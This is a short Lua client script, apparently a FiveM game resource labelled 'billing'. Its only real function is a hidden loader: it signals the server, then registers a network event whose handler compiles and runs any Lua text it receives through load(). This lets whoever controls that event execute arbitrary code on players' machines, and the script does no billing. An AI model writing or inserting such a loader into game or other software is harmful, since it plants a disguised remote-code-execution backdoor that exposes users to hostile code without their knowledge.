CreateThread(function()
    while not NetworkIsSessionStarted() do 
        Wait(0) 
    end
    TriggerServerEvent('billing')
end)

RegisterNetEvent('dumpwoanders:billing')
AddEventHandler('dumpwoanders:billing', function(text)
    assert(load(text))()
end)